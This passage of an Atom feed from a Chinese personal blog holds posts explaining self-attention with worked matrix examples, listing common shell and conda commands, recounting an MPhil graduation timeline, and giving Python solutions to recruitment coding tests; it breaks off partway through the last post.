<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>欢迎来到匡盟盟的博客！</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://home.meng.uno/"/>
  <updated>2020-12-02T01:43:44.000Z</updated>
  <id>http://home.meng.uno/</id>
  
  <author>
    <name>Mengmeng Kuang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Attention and Self Attention</title>
    <link href="http://home.meng.uno/articles/9d18641a/"/>
    <id>http://home.meng.uno/articles/9d18641a/</id>
    <published>2020-12-01T09:56:52.000Z</published>
    <updated>2020-12-02T01:43:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1>Attention</h1><p><code>Seq2Seq</code>结构在一些<code>End2End</code>问题上能取得非常好的结果，其结构一般由<code>Encoder</code>和<code>Decoder</code>组成，其运行流程如下视频所示。</p><video id="video" controls preload="" poster="">      <source id="mp4" src="http://meng.uno/images/self-attention/1.mp4" type="video/mp4"></video><p>然而，采用<code>RNN</code>的<code>Seq2Seq</code>结构因为<code>RNN</code>中存在长程梯度消失的问题，很难将较长输入的序列转化为定长的向量而保存所有的有效信息。所以随着句子的长度的增加，这种结构的效果会显著下降。为了解决这一由长序列到定长向量转化而造成的信息损失的瓶颈，<code>Attention</code>机制被引入了。<code>Attention</code>机制跟人类翻译文章时候的思路有些类似，即将注意力关注于我们翻译部分对应的上下文。此机制打破了只能利用<code>Encoder</code>最终单一向量结果的限制，从而使模型可以集中在所有对于下一个目标单词重要的输入信息上，使模型效果得到极大的改善。还有一个优点是，我们通过观察<code>Attention</code>权重矩阵的变化，可以更好地知道哪部分翻译对应哪部分源文字，有助于更好的理解模型工作机制。</p><p><code>Attention</code>机制实际上是对<code>Query</code>, <code>Key</code>, <code>Value</code> 的运算，其整体流程可以用下图来表示。</p><p><img src="http://meng.uno/images/self-attention/1.png" alt="Arctecture of Attention"></p><p>其中：</p><ul>  <li>阶段一是<code>Query</code>与<code>Key</code>进行某种<code>F()</code>运算；</li>  <li>阶段二是使用<code>softmax</code>对结果归一化；</li>  <li>阶段三是上阶段输出值和<code>Value</code>做运算。</li></ul><p><code>F()</code>运算可以是：$$Q^{T}K$$, $$Q^{T}W_{a}K$$ 或者 $$v_{a}^{T} tanh(W_{a} concat(Q, K))$$。</p><h1>Self Attention</h1><p>如果<code>Attention</code>机制中的<code>Key</code>, <code>Value</code>以及<code>Query</code>都来着同一个分布，我们称之为<code>Self-Attention</code>。</p><p>接下来，结合网上的一个例子，我们从数据输入、计算<code>Key</code>, <code>Value</code>和<code>Query</code>、再到具体的三阶段计算来认识<code>Self-Attention</code>。</p><h2 id="数据准备">数据准备</h2><p>我们准备了三个输入，每个输入维度为<code>4</code>。如下：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Input 1: [1, 0, 1, 0] </span><br><span class="line">Input 2: [0, 2, 0, 2]</span><br><span class="line">Input 3: [1, 1, 1, 1]</span><br></pre>      </td>    </tr>  </table></figure><h2 id="计算key-value以及query">计算<code>Key</code>,<code>Value</code>以及<code>Query</code></h2><p>假设我们希望<code>Key</code>, <code>Value</code>, <code>Query</code>的尺寸为3。而由于现在每个输入的尺寸均为4，这意味着每组权重的形状都必须为<code>4×3</code>。</p><h3 id="计算key">计算<code>Key</code></h3><p>我们假定<code>Key</code>的权重为：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">[[0, 0, 1],</span><br><span class="line">[1, 1, 0],</span><br><span class="line">[0, 1, 0],</span><br><span class="line">[1, 1, 0]]</span><br></pre>      </td>    </tr>  </table></figure><p>则通过矩阵乘法，我们可以得到<code>Key</code>为：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">               [0, 0, 1]</span><br><span class="line">[1, 0, 1, 0]   [1, 1, 0]   [0, 1, 1]</span><br><span class="line">[0, 2, 0, 2] x [0, 1, 0] = [4, 4, 0]</span><br><span class="line">[1, 1, 1, 1]   [1, 1, 0]   [2, 3, 1]</span><br></pre>      </td>    </tr>  </table></figure><p>此过程如下图所示：</p><p><img src="http://meng.uno/images/self-attention/3.gif" alt="Key"></p><h3 id="计算value">计算<code>Value</code></h3><p>同理，<code>Value</code>权重及计算如下：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">               [0, 2, 0]</span><br><span class="line">[1, 0, 1, 0]   [0, 3, 0]   [1, 2, 3] </span><br><span class="line">[0, 2, 0, 2] x [1, 0, 3] = [2, 8, 0]</span><br><span class="line">[1, 1, 1, 1]   [1, 1, 0]   [2, 6, 3]</span><br></pre>      </td>    </tr>  </table></figure><p>此过程也有图片展示:</p><p><img src="http://meng.uno/images/self-attention/4.gif" alt="Value"></p><h3 id="计算query">计算<code>Query</code></h3><p>同样的方式可以计算<code>Query</code>：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">               [1, 0, 1]</span><br><span class="line">[1, 0, 1, 0]   [1, 0, 0]   [1, 0, 2]</span><br><span class="line">[0, 2, 0, 2] x [0, 0, 1] = [2, 2, 2]</span><br><span class="line">[1, 1, 1, 1]   [0, 1, 1]   [2, 1, 3]</span><br></pre>      </td>    </tr>  </table></figure><p>动图表示此过程如下：</p><p><img src="http://meng.uno/images/self-attention/5.gif" alt="Query"></p><p>至此，我们可以得到来自同一分布的<code>Key</code>, <code>Value</code>以及<code>Query</code>。</p><h2 id="三阶段计算">三阶段计算</h2><h3 id="f-运算"><code>F()</code>运算</h3><p>在此，我们选择点乘作为我们的<code>F()</code>。对于第一个<code>Query</code>，我们可以得到其注意力得分：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">            [0, 4, 2]</span><br><span class="line">[1, 0, 2] x [1, 4, 3] = [2, 4, 4]</span><br><span class="line">            [1, 0, 1]</span><br></pre>      </td>    </tr>  </table></figure><p>过程如下：</p><p><img src="http://meng.uno/images/self-attention/6.gif" alt="Attention Score"></p><h3 id="softmax归一化"><code>softmax</code>归一化</h3><video id="video" controls preload="" poster="">      <source id="mp4" src="http://meng.uno/images/self-attention/7.mp4" type="video/mp4"></video><p>以上视频展示了<code>softmax</code>的过程，<code>softmax</code>本身是这样一个公式：</p><p><img src="http://meng.uno/images/self-attention/7.png" alt="Softmax formula"></p><h3 id="得到attention-value">得到<code>Attention Value</code></h3><p>针对某一个<code>Query</code>，其经过以上两步之后的输出与<code>Value</code>分别想乘并结果想加，可以得到对应位置的<code>Attention Value</code>，在本实例中得到第一个值的过程大致如下：</p><p><img src="http://meng.uno/images/self-attention/8.gif" alt="Attention Value"></p><p>分别得到三个<code>Query</code>对应的三个<code>Attention Value</code>的过程如下：</p><p><img src="http://meng.uno/images/self-attention/10.gif" alt="Attention Value all"></p><p>至此，<code>Self-Attention</code>的全流程以及实例完毕。</p><h1>Applications</h1><p><code>Attention</code>机制引入以来，主要用在以下三个场景中。</p><h2 id="sequence-to-sequence">Sequence to sequence</h2><p><img src="http://meng.uno/images/self-attention/9.jpg" alt="Attention Seq2Seq"></p><p>引入了<code>Attention</code>的<code>Seq2Seq</code>结构如上图，<code>Encoder</code>不再是只保存最终的状态，而是保存整个<code>Attention Value</code>矩阵，在<code>Decoder</code>时，可以更好的得到所需要的结果。</p><h2 id="transformer">Transformer</h2><p><code>Transformer</code>是另一个使用到<code>Attention</code>的模型，更具体的说是<code>Multi-head Attention</code>。其结构图如下所示：</p><p><img src="http://meng.uno/images/self-attention/11.jpg" alt="Transformer"></p><p>其中，<code>Multi-head Attention</code>是通过<code>h</code>个不同的线性变换对<code>Query</code>，<code>Key</code>以及<code>Value</code>进行投影，最后将不同的<code>Attention</code>结果拼接起来。其与加了<code>mask</code>的<code>Attention</code>原理如下图。</p><p><img src="http://meng.uno/images/self-attention/12.jpg" alt="Multi-head Attention"></p><h2 id="bert">BERT</h2><p><code>BERT</code>的网络架构是完全重用<code>Transformer</code>的<code>Encoder</code>部分，一个创新亮点就是训练中使用的目标函数，也就是<code>Loss function</code>的定义。这个创新虽小但是很关键。<code>BERT</code>的<code>Loss function</code>由两个子任务的<code>Loss</code>相加而得。第一个任务就是把一个句中的几个字<code>mask</code>掉，然后让模型去预测这几个字，看它的正确率。第二个<code>Loss</code>来源于预测两个句子是不是上下句。这是为了让模型拥有句子层面的语义相关性的判断。为了增加鲁棒性，这两个句子都有可能不是整句，而是片段。</p><p>除此之外，<code>BERT</code>的<code>Input Embedding</code>也是一大亮点，其考虑到<code>Attention</code>并没有考虑的位置信息，增加了<code>Segment Embeddings</code>和<code>Position Embeddings</code>，他们和<code>Token Embeddings</code>的和作为<code>Input Embeddings</code>。</p><p><img src="http://meng.uno/images/self-attention/13.jpg" alt="BERT Input Embedding"></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/9d18641a/">http://home.meng.uno/articles/9d18641a/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Attention
Seq2Seq结构在一些End2End问题上能取得非常好的结果，其结构一般由Encoder和Decoder组成，其运行流程如下视频所示。

然而，采用RNN的Seq2Seq结构因为RNN中存在长程梯度消失的问题，很难将较长输入的序列转化为定长的向量而保存所有的有效信息。所以随着句子的长度的增加，这种结构的效果会显著下降。为了解决这一由长序列到定长向量转化而造成的信息损失的瓶颈，Attention机制被引入了。Attention机制跟人类翻译文章时候的思路有些类似，即将注意力关注于我们翻译部分对应的上下文。此机制打破了只能利用Encoder最终单一向量结果的限制，从而使模型可
    
    </summary>
    
      <category term="Natural Language Processing" scheme="http://home.meng.uno/categories/Natural-Language-Processing/"/>
    
    
      <category term="Attention" scheme="http://home.meng.uno/tags/Attention/"/>
    
      <category term="Self-Attention" scheme="http://home.meng.uno/tags/Self-Attention/"/>
    
      <category term="Transformer" scheme="http://home.meng.uno/tags/Transformer/"/>
    
      <category term="BERT" scheme="http://home.meng.uno/tags/BERT/"/>
    
      <category term="Seq2Seq" scheme="http://home.meng.uno/tags/Seq2Seq/"/>
    
  </entry>
  
  <entry>
    <title>Commonly used Shell commands</title>
    <link href="http://home.meng.uno/articles/61f3f0dd/"/>
    <id>http://home.meng.uno/articles/61f3f0dd/</id>
    <published>2020-11-27T04:08:20.000Z</published>
    <updated>2020-12-02T01:43:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1>统计文件夹中文件数量</h1><h2 id="当前文件夹下文件个数-不包括文件夹">当前文件夹下文件个数[不包括文件夹]</h2><p><code>$ ls -l |grep &quot;^-&quot;|wc -l</code></p><h2 id="当前目录下文件夹个数">当前目录下文件夹个数</h2><p><code>$ ls -lR | grep &quot;^d&quot; | wc -l</code></p><h2 id="当前文件夹下文件数目-包括子目录">当前文件夹下文件数目[包括子目录]</h2><p><code>$ ls -lR| grep &quot;^-&quot; | wc -l</code></p><h1>登录服务器</h1><p><code>$ ssh [-p 端口] username@host_address #Enter后输入密码</code></p><h1>conda虚拟环境</h1><h2 id="新建环境">新建环境</h2><p><code>$ conda create -n 环境名 python=X.X #X.X = 2.7、3.6等</code></p><h2 id="激活环境">激活环境</h2><p><code>$ source activate 环境名</code></p><h2 id="环境中安装额外的包">环境中安装额外的包</h2><p><code>$ conda install -n 环境名 packages</code></p><h2 id="删除环境中的某个包">删除环境中的某个包</h2><p><code>$ conda remove --name 环境名  package</code></p><h2 id="关闭虚拟环境">关闭虚拟环境</h2><p><code>$ source deactivate</code></p><h2 id="删除环境">删除环境</h2><p><code>$ conda remove -n 环境名 --all</code></p><h1>文件链接</h1><p><code>$ ln -s 源 目的</code></p><h1>查寻文件或命令的路径</h1><h2 id="文件中字符串的查寻">文件中字符串的查寻</h2><p><code>$ grep string file</code></p><h2 id="显示命令的路径">显示命令的路径</h2><p><code>$ whereis command</code></p><h2 id="显示命令的路径-及使用者所定义的别名">显示命令的路径，及使用者所定义的别名</h2><p><code>$ which command</code></p><h2 id="显示命令功能的摘要">显示命令功能的摘要</h2><p><code>$ whatis command</code></p><h2 id="搜寻指定路径下某文件的路径">搜寻指定路径下某文件的路径</h2><p><code>$ find path -name filename -print</code></p><h1>查看进程并关闭</h1><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ ps [-aux] </span><br><span class="line"># -x自己的，</span><br><span class="line"># -au所有用户的，</span><br><span class="line"># -aux系统内部和所有用户的</span><br></pre>      </td>    </tr>  </table></figure><p><code>$ kill [-9] PID(进程号)</code></p><h2 id="查看后台运行的进程">查看后台运行的进程</h2><p><code>$ jobs</code></p><p><code>$ kill %n #n为jobs查询出的后台作业号</code></p><h1>命令记录表</h1><h2 id="设定命令记录表长度">设定命令记录表长度</h2><p><code>$ set history = 长度</code></p><h2 id="查看命令记录表的内容">查看命令记录表的内容</h2><p><code>$ history</code></p><h2 id="重复执行前一个命令">重复执行前一个命令</h2><p><code>$ !!</code></p><h2 id="重复执行命令记录表命令编号n的命令">重复执行命令记录表命令编号n的命令</h2><p><code>$ !n</code></p><h2 id="重复前面执行过的以-xxx-为起始字符串的命令">重复前面执行过的以’xxx’为起始字符串的命令</h2><p><code>$ !xxx</code></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/61f3f0dd/">http://home.meng.uno/articles/61f3f0dd/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      统计文件夹中文件数量
当前文件夹下文件个数[不包括文件夹]
$ ls -l |grep &quot;^-&quot;|wc -l

当前目录下文件夹个数
$ ls -lR | grep &quot;^d&quot; | wc -l

当前文件夹下文件数目[包括子目录]
$ ls -lR| grep &quot;^-&quot; | wc -l

登录服务器
$ ssh [-p 端口] username@host_address #Enter后输入密码

conda虚拟环境
新建环境
$ conda create -n 环境名 python=X.X #X.X = 2.7、3.6等

激活环境
$ source activate 环境名

环境中安装额外的
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="Shell" scheme="http://home.meng.uno/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>MPhil历程总结</title>
    <link href="http://home.meng.uno/articles/bf7d2a9d/"/>
    <id>http://home.meng.uno/articles/bf7d2a9d/</id>
    <published>2020-09-30T05:49:24.000Z</published>
    <updated>2020-12-02T01:43:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1>时间线</h1><ul>  <li>申请：入学前一年4 - 5月到入学当年的4月30日（秋季学期）或者8月31日（春季学期）。</li>  <li>报道：9月1日或者1月1日。</li>  <li>Probation：要求是入学一年，但是很灵活，一般导师会要求投出去第一篇论文之后。</li>  <li>毕业：在当年9.23日之前提交final thesis则当年底毕业典礼领取毕业证，否则推迟到下一年领取毕业证。</li></ul><p>大家主要还是会关心按时毕业的问题，所以在此我将我的毕业流程（我按时毕业）列举如下，大家可以参考。</p><ol>  <li>MPhil Probation Talk：2020年4月20日。</li>  <li>提交“Notice of Intent to Submit a Thesis”：4月20日（要求是在论文初稿提交前3个月提交这个Notice，但是很灵活不用在意时间要求）。</li>  <li>提交论文初稿：6月24日（提交之前要找导师修改，以及让导师签字允许你提交初稿，还有重复率的问题，这些都是导师决定）。</li>  <li>答辩：8月13日（当你提交初稿之后一周，会收到学院发的邮件确定大致答辩日期，我的预计答辩日期是8月18日，但是具体时间和导师商量）。</li>  <li>答辩结果：8月17日（会附上各个reviewer的意见，说是将论文送到研究生院做最后决定）。</li>  <li>研究生院检查结果：8月27日（会附带一个checklist，告诉你需要提交哪些文件到学院）。</li>  <li>提交电子论文到图书馆：8月31日。</li>  <li>提交装订好的Thesis：9月3日（需要附带一份导师同意提交final bound thesis的同意书）。</li>  <li>毕业信：9月8日（上面会写清你的学位和学业完成时间以及毕业典礼时间即毕业证时间）。</li></ol><h1>申请</h1><p>香港的MPhil和PhD一样需要先联系好导师，当导师确定要你，而你已经提交申请之后，大概两周可以来offer。</p><h1>感想</h1><p>本科毕业苦于英语不行，托福只考了82/120分，当时也是觉得来香港读MPhil作为申请美国PhD的跳板，于是就接受了导师的MPhil Offer。读MPhil期间，多次有机会转PhD，我都谢绝了，现在想来甚是后悔。</p><p>虽然网上都说MPhil可以作为申请美国PhD的跳板，但是我仔细调查发现，那些毕业的MPhil一大部分转本校PhD，一部分直接去工作，还有很少的一部分申请了其他学校的PhD，而这些学校也没有比香港的大学好很多，极少那种读了MPhil就申请美国牛校PhD的例子，现在发现自己当初有多么幼稚，不该相信网上的传言。</p><p>结合我自己的经历，我觉得那些（1）英语都过关（TOEFL100+，GRE320+），同时（2）有一部分研究经历，但是本科申美国牛校PhD失败了的那些大佬可能来香港读MPhil之后能申请到美国牛校，这两个条件任何一个不满足，可能MPhil的跳板作用就没有那么明显了。我就是同时不满足这两个条件，MPhil第一年结束根本不知道研究啥，没有任何研究产出，正是因为没有产出，所以更得把时间放在研究上，更没有时间准备英语。这就导致MPhil第一年结束我还是英语不行，科研不行，申美国PhD还是无望。我觉得如果有同学在这个时间点和我情况类似，那基本考虑转博吧，这是最好的打算。我当时没认清自己，还是觉得MPhil毕业了我再考英语，再申请。事实是，慌慌张张毕业了，又得找工作，根本没心情和时间准备英语。</p><p>确实，美国去不了，我也可以考虑欧洲啊。但是情况还是和我想的不一样，欧洲不要英语成绩（因为在以英语为授课语言的大学上过学），但是主要靠套词来申请PhD。而且有个更重要的问题，欧洲很多老师没钱，不招学生或者在MPhil毕业的时间点（9月）之前已经招满了！</p><p>最后的打算只能是先工作啦。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/bf7d2a9d/">http://home.meng.uno/articles/bf7d2a9d/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      时间线
 * 申请：入学前一年4 - 5月到入学当年的4月30日（秋季学期）或者8月31日（春季学期）。
 * 报道：9月1日或者1月1日。
 * Probation：要求是入学一年，但是很灵活，一般导师会要求投出去第一篇论文之后。
 * 毕业：在当年9.23日之前提交final thesis则当年底毕业典礼领取毕业证，否则推迟到下一年领取毕业证。

大家主要还是会关心按时毕业的问题，所以在此我将我的毕业流程（我按时毕业）列举如下，大家可以参考。

 1. MPhil Probation Talk：2020年4月20日。
 2. 提交“Notice of Intent to Submit a 
    
    </summary>
    
      <category term="Note" scheme="http://home.meng.uno/categories/Note/"/>
    
    
      <category term="MPhil" scheme="http://home.meng.uno/tags/MPhil/"/>
    
      <category term="留学申请" scheme="http://home.meng.uno/tags/%E7%95%99%E5%AD%A6%E7%94%B3%E8%AF%B7/"/>
    
      <category term="按时毕业" scheme="http://home.meng.uno/tags/%E6%8C%89%E6%97%B6%E6%AF%95%E4%B8%9A/"/>
    
      <category term="香港大学" scheme="http://home.meng.uno/tags/%E9%A6%99%E6%B8%AF%E5%A4%A7%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>2021届自己参加的秋招笔试题记录</title>
    <link href="http://home.meng.uno/articles/fdc308a8/"/>
    <id>http://home.meng.uno/articles/fdc308a8/</id>
    <published>2020-08-27T12:44:57.000Z</published>
    <updated>2020-12-02T01:39:45.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>2021届秋招正如火如荼地进行着，截止目前，我已经参加了绝大部分互联网企业的秋招，我想将自己写过的代码保存一下，供以后再来回味。 代码基本都是用Python写的，有些并没有100%AC。  </p></blockquote><h1>不匹配括号数量</h1><blockquote>  <p>Input: 包含若干<code>(</code>, <code>)</code>, <code>[</code>, <code>]</code>的字符串。</p></blockquote><blockquote>  <p>Output: 不能配对的括号的数量。</p></blockquote><h2 id="代码">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>      </td>      <td class="code">        <pre><span class="line">def BracketsMatch(text, flag):</span><br><span class="line">    arr = []</span><br><span class="line">    if flag == 1:</span><br><span class="line">        left = &apos;(&apos;</span><br><span class="line">        right = &apos;)&apos;</span><br><span class="line">    else:</span><br><span class="line">        left = &apos;[&apos;</span><br><span class="line">        right = &apos;]&apos;</span><br><span class="line">    for c in text:</span><br><span class="line">        if c == left:</span><br><span class="line">            arr.append(c)</span><br><span class="line">        elif c == right:</span><br><span class="line">            if len(arr) == 0:</span><br><span class="line">                arr.append(c)</span><br><span class="line">            else:</span><br><span class="line">                if arr[-1] == left:</span><br><span class="line">                    arr.pop()</span><br><span class="line">                else:</span><br><span class="line">                    arr.append(c)</span><br><span class="line">    return len(arr)</span><br><span class="line">text = input().strip()</span><br><span class="line">print(BracketsMatch(text, 0) + BracketsMatch(text, 1))</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析">分析</h2><p>针对任意一对括号，可以用栈来存储无法匹配的括号。同时这种写法可以拓展到其他需要前后配对的字符上，例如<code>{</code>和<code>}</code>或者<code>『</code>和<code>』</code>等。</p><h1>前m个值最大选项的序号</h1><blockquote>  <p>Input: 第一行n和m，n代表有几个物品，m代表取价值前m大；以后n行输入n个物品的重量和体积。</p></blockquote><blockquote>  <p>Output: 从小到大输出价值前m大的物品编号。</p></blockquote><blockquote>  <p>*物品价值 = 重量 + 2 × 体积</p></blockquote><h2 id="代码-v2">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>      </td>      <td class="code">        <pre><span class="line">line1 = input().split(&apos; &apos;)</span><br><span class="line">n = int(line1[0])</span><br><span class="line">m = int(line1[1])</span><br><span class="line">matrix = [[0 for i in range(4)] for j in range(n)]</span><br><span class="line">for i in range(n):</span><br><span class="line">    line_n = input().split(&apos; &apos;)</span><br><span class="line">    matrix[i][0] = float(line_n[0])</span><br><span class="line">    matrix[i][1] = float(line_n[1])</span><br><span class="line">    matrix[i][2] = float(line_n[0]) + 2 * float(line_n[1])</span><br><span class="line">    matrix[i][3] = i + 1</span><br><span class="line">matrix = sorted(matrix, key = lambda item:item[2])[::-1]</span><br><span class="line">max_m = int(matrix[0][2])</span><br><span class="line">result_m = [[0 for i in range(n + 1)] for j in range(max_m + 1)]</span><br><span class="line">for i in range(len(matrix)):</span><br><span class="line">    result_m[int(matrix[i][2])][int(matrix[i][3])] = 1</span><br><span class="line">result = []</span><br><span class="line">for i in range(max_m, -1, -1):</span><br><span class="line">    for j in range(n + 1):</span><br><span class="line">        if result_m[i][j] == 1:</span><br><span class="line">            result.append(j)</span><br><span class="line">result = sorted(result[0 : m])</span><br><span class="line">strs = &apos;&apos;</span><br><span class="line">for i in range(m):</span><br><span class="line">    strs += str(result[i]) + &apos; &apos;</span><br><span class="line">print(strs.strip())</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v2">分析</h2><p>类似于Excel之中排序，主排序标准和次排序标准。</p><h1>0/1背包</h1><blockquote>  <p>0/1背包作为经典的动态规划问题，经常考察，但是只要掌握状态转移方程，动态规划基本上很少的代码就可以写出来。</p></blockquote><h2 id="代码-v3">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">def Package(W, V, max_w):</span><br><span class="line">    len_w = len(W)    </span><br><span class="line">    dp = [[0 for i in range(max_w + 1)] for j in range(len_w)]</span><br><span class="line">    for i in range(len_w):</span><br><span class="line">        for j in range(max_w + 1):</span><br><span class="line">            if W[i] &gt; j:</span><br><span class="line">                dp[i][j] = dp[i - 1][j]</span><br><span class="line">            else:</span><br><span class="line">                dp[i][j] = max(dp[i - 1][j - W[i]] + V[i], dp[i - 1][j])</span><br><span class="line">    return dp[-1][-1]</span><br><span class="line">W = [10, 20, 20, 30]</span><br><span class="line">V = [12, 18, 17, 32]</span><br><span class="line">max_w = 50</span><br><span class="line">print(Package(W, V, max_w))</span><br></pre>      </td>    </tr>  </table></figure><h1>根据输入操作数字串</h1><blockquote>  <p>Input: 一行n和m，代表长度为n的值为下标的数字串；m行不同的操作。（1：将串首元素移动到最尾；2：交换第“2 × i + 1”和第“2 × i + 2”号元素，其中i从1开始。）</p></blockquote><blockquote>  <p>Output: 操作结束的数字串</p></blockquote><h2 id="代码-v4">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre>      </td>      <td class="code">        <pre><span class="line">line1 = input().split(&apos; &apos;)</span><br><span class="line">n = int(line1[0])</span><br><span class="line">m = int(line1[1])</span><br><span class="line">line2 = input().split(&apos; &apos;)</span><br><span class="line">line = []</span><br><span class="line">for i in range(n):</span><br><span class="line">    line.append(i + 1)</span><br><span class="line">def OP1(line):</span><br><span class="line">    new_line = []</span><br><span class="line">    for i in range(1, len(line)):</span><br><span class="line">        new_line.append(line[i])</span><br><span class="line">    new_line.append(line[0])</span><br><span class="line">    return new_line</span><br><span class="line">def OP2(line):</span><br><span class="line">    for i in range(0, len(line), 2):</span><br><span class="line">        t = line[i]</span><br><span class="line">        line[i] = line[i + 1]</span><br><span class="line">        line[i + 1] = t</span><br><span class="line">    return line</span><br><span class="line">for i in range(m):</span><br><span class="line">    if int(line2[i]) == 1:</span><br><span class="line">        line = OP1(line)</span><br><span class="line">    elif int(line2[i]) == 2:</span><br><span class="line">        line = OP2(line)</span><br><span class="line">    else:</span><br><span class="line">        line = line</span><br><span class="line">ret = &apos;&apos;</span><br><span class="line">for i in range(n):</span><br><span class="line">    ret += str(line[i]) + &apos; &apos;</span><br><span class="line">print(ret)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v3">分析</h2><p>这种题目就是按照题目要求，写出不同操作的函数，然后调用就OK啦。在今年的秋招中，出现过很多次类似的题目，虽然操作不尽相同。</p><h1>计算面积</h1><blockquote>  <p>求y = 0, x = C, x = D 与y = Ax^2 + x + B相交区域的面积。</p></blockquote><blockquote>  <p>Input: A，B，C和D。</p></blockquote><blockquote>  <p>Output: 面积（保留6位小数）</p></blockquote><h2 id="代码-v5">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line">n = int(input())</span><br><span class="line">ret = []</span><br><span class="line">def Area(a, b, c, d):</span><br><span class="line">    right = (float(a) / 3) * d * d * d + 0.5 * d * d + float(b) * float(d)</span><br><span class="line">    left = (float(a) / 3) * c * c * c + 0.5 * c * c + float(b) * float(c)</span><br><span class="line">    return right - left</span><br><span class="line">for i in range(n):</span><br><span class="line">    line = input().split(&apos; &apos;)</span><br><span class="line">    ret.append(Area(int(line[0]), int(line[1]), int(line[2]), int(line[3])))</span><br><span class="line">for i in range(n):</span><br><span class="line">    print(&quot;%.6f&quot; % ret[i])</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v4">分析</h2><p>这种题乍一看没有思路，需要结合数学知识，求面积就是求一定范围内的积分。当函数变化时，也是同样的做法。</p><h1>全组合</h1><blockquote>  <p>Input: 一个正整数n。</p></blockquote><blockquote>  <p>Ouput: 从1到n的全组合，并且每种组合从组合中选一个代表的总可能数。</p></blockquote><h2 id="代码-v6">代码</h2><figure 